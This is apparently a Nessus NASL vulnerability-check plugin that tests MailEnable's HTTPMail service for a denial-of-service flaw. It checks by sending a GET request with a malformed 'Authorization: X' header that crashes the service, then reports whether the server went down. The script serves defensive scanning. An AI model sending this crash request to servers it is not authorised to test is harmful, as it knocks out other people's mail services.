#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(14654);
  script_version("$Revision: 1.3 $");

  name["english"] = "MailEnable HTTPMail Service Authorization Header DoS Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server is affected by a denial of service flaw.

Description :

The remote host is running an instance of MailEnable that has a flaw
in the HTTPMail service (MEHTTPS.exe) in the Professional and
Enterprise Editions.  The flaw can be exploited by issuing an HTTP
request with a malformed Authorization header, which causes a NULL
pointer dereference error and crashes the HTTPMail service. 

See also :

http://www.oliverkarow.de/research/MailWebHTTPAuthCrash.txt
http://archives.neohapsis.com/archives/bugtraq/2004-05/0159.html 

Solution : 

Upgrade to MailEnable Professional / Enterprise 1.19 or later. 

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:A)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for authorization header DoS vulnerability in MailEnable HTTPMail service";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);
if (http_is_dead(port:port)) exit(0);


# Make sure banner's from MailEnable.
banner = get_http_banner(port:port);
if (banner && egrep(pattern:"^Server: .*MailEnable", string:banner)) {
  # Try to bring it down.
  req = string(
    "GET / HTTP/1.0\r\n",
    "Authorization: X\r\n",
    "\r\n"
  );
  debug_print("req='", req, "'.\n");
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  debug_print("res='", res, "'.\n");

  # There's a problem if the web server is down.
  if (isnull(res)) {
    if (http_is_dead(port:port)) security_warning(port);
  }
}
